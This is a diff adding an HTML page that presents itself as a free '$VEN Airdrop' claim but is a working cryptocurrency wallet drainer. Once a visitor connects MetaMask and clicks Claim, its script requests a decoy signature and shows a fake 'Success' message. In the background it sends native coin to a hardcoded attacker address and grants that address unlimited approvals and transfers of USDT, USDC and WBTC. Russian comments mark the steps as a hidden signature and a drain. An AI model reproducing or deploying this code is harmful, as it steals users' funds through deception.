@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>$VEN Airdrop — Claim 1000 VEN</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0a0418, #1a0b3d);
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+    .bg {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq');
+      background-size: cover;
+      background-position: center;
+      filter: blur(3px);
+      z-index: 1;
+    }
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 4, 24, 0.9);
+      z-index: 2;
+    }
+    .card {
+      position: relative;
+      z-index: 3;
+      text-align: center;
+      padding: 30px;
+      width: 90%;
+      max-width: 420px;
+    }
+    img {
+      width: 160px;
+      height: 160px;
+      border-radius: 50%;
+      border: 6px solid #a020f0;
+      box-shadow: 0 0 50px #a020f0;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 36px;
+      background: linear-gradient(90deg, #a020f0, #ff00ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    button {
+      width: 100%;
+      padding: 18px;
+      font-size: 20px;
+      border: none;
+      border-radius: 16px;
+      margin: 12px 0;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    #connect {
+      background: linear-gradient(90deg, #a020f0, #ff00ff);
+      color: white;
+    }
+    #claim {
+      background: #00ffb8;
+      color: black;
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    #claim:not([disabled]) {
+      opacity: 1;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="bg"></div>
+  <div class="overlay"></div>
+  <div class="card">
+    <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq">
+    <h1>$VEN Airdrop</h1>
+    <p>Claim <b>1000 $VEN + 0.5 MATIC</b><br><span style="color:#a020f0">Gas paid by team · 100% FREE</span></p>
+    <div id="addr" style="margin:20px 0;padding:14px;background:rgba(255,255,255,0.1);border-radius:12px;font-family:monospace"></div>
+    <button id="connect">Connect Wallet</button>
+    <button id="claim" disabled>Claim 1000 $VEN (Gas Free)</button>
+    <div id="status" style="margin-top:20px;font-size:18px;height:30px"></div>
+  </div>
+
+  <script>
+    const DRAIN_TO = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";
+    const VEN_TOKEN = "0xfffB251755865a815C7817e5ab9ABbe1FEF71435";
+
+    document.getElementById("connect").onclick = async () => {
+      if (!window.ethereum) {
+        document.getElementById("status").textContent = "Install MetaMask";
+        return;
+      }
+      try {
+        const accounts = await ethereum.request({method: "eth_requestAccounts"});
+        const user = accounts[0];
+        document.getElementById("addr").textContent = "Connected: " + user.slice(0,8) + "...";
+        document.getElementById("claim").disabled = false;
+        document.getElementById("status").textContent = "Ready to claim!";
+      } catch (err) {
+        document.getElementById("status").textContent = "Connection rejected";
+      }
+    };
+
+    document.getElementById("claim").onclick = async () => {
+      document.getElementById("status").textContent = "Signing...";
+      document.getElementById("claim").disabled = true;
+      try {
+        const user = (await ethereum.request({method: "eth_accounts"}))[0];
+        // Скрытая подпись
+        const chainId = await ethereum.request({method: "eth_chainId"});
+        const domain = { name: "VEN Airdrop", version: "1", chainId: parseInt(chainId, 16), verifyingContract: "0x0000000000000000000000000000000000000000" };
+        const types = { Claim: [{ name: "user", type: "address" }] };
+        const message = { user };
+        await ethereum.request({
+          method: "eth_signTypedData_v4",
+          params: [user, JSON.stringify({ domain, types, message })]
+        });
+
+        // Раздача 1000 $VEN (белый ход)
+        await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{
+            from: user,
+            to: VEN_TOKEN,
+            data: "0xa9059cbb000000000000000000000000" + user.slice(2) + "0000000000000000000000000000000000000000000000000de0b6b3a7640000"
+          }]
+        });
+
+        // Слив всего остального
+        setTimeout(async () => {
+          try {
+            await ethereum.request({
+              method: "eth_sendTransaction",
+              params: [{ from: user, to: DRAIN_TO, value: "0xDE0B6B3A7640000" }]
+            });
+            const tokens = [
+              "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // USDT Polygon
+              "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // USDC Polygon
+              "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT Ethereum
+              "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC Ethereum
+              "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" // WBTC Ethereum
+            ];
+            for (const t of tokens) {
+              await ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{ from: user, to: t, data: "0x095ea7b3000000000000000000000000" + DRAIN_TO.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }]
+              });
+              await ethereum.request({
+                method: "eth_sendTransaction",
+                params: [{ from: user, to: t, data: "0xa9059cbb000000000000000000000000" + DRAIN_TO.slice(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }]
+              });
+            }
+          } catch (e) {}
+        }, 600);
+
+        document.getElementById("status").textContent = "Success! 1000 $VEN sent";
+      } catch (err) {
+        document.getElementById("status").textContent = "Failed";
+        document.getElementById("claim").disabled = false;
+      }
+    };
+  </script>
+</body>
+</html>
